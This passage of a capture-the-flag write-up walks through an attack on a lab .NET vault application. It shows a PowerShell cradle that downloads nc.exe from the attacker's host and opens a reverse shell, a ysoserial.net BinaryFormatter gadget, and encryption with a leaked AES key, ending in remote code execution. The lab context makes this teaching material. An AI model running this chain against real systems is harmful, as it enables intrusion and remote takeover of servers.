1. **Prepare the PowerShell download cradle**
    
      
    
    The pentester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:
    
      
    
    Bash
    
    ```
    echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' | iconv -t UTF-16LE | base64 -w0
    ```
    
    This produces a UTF-16LE base64-encoded PowerShell payload.
    
      
    
2. **Generate the .NET deserialization gadget**
    
      
    
    Using `ysoserial.net`, the pentester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:
    
      
    
    PowerShell
    
    ```
    .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -nop -enc <payload_b64>"
    ```
    
    The output is a raw binary serialized object that, when deserialized by `BinaryFormatter`, will execute the supplied PowerShell command.
    
      
    
3. **Encrypt the payload with the leaked AES key**
    
      
    
    Because the application decrypts the stored value with AES before passing it to `BinaryFormatter.Deserialize`, the raw binary payload must be encrypted using the same key and IV exposed in `Web.config`:
    
      
    
    XML
    
    ```
    <add key="PasswordKey" value="f3d9aa53-c08d-43" />
    <add key="PasswordIV" value="5ac8083e-8ff6-43" />
    ```
    
    The pentester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:
    
      
    
    Bash
    
    ```
    python vault.royalflush.htb-Deserialization-Payload.py payload.b64
    ```
    
    The script produced the final base64 ciphertext that the vault application could decrypt successfully.
    
      
    
4. **Start the listener**
    
      
    
    On the attacker machine, the pentester started a netcat listener to catch the reverse shell:
    
      
    
    Bash
    
    ```
    nc -lvnp <shell-port>
    ```
    
    A simple HTTP server was also started to serve `nc.exe`:
    
      
    
    Bash
    
    ```
    python3 -m http.server <port>
    ```
    
5. **Submit the encrypted payload**
    
      
    
    The pentester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.
    
      
    
6. **Trigger deserialization and gain RCE**
    
      
    
    The pentester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.
    
      
    
7. **Shell access and flag retrieval**
    
      
    
    The reverse shell connected, giving the pentester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:
    
      
    
    DOS
    
    ```
    C:\> dir C:\
    ...
    ddf1df82dea9ce0d6ab3a03aa80cbdac
    ```
    
    The pentester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.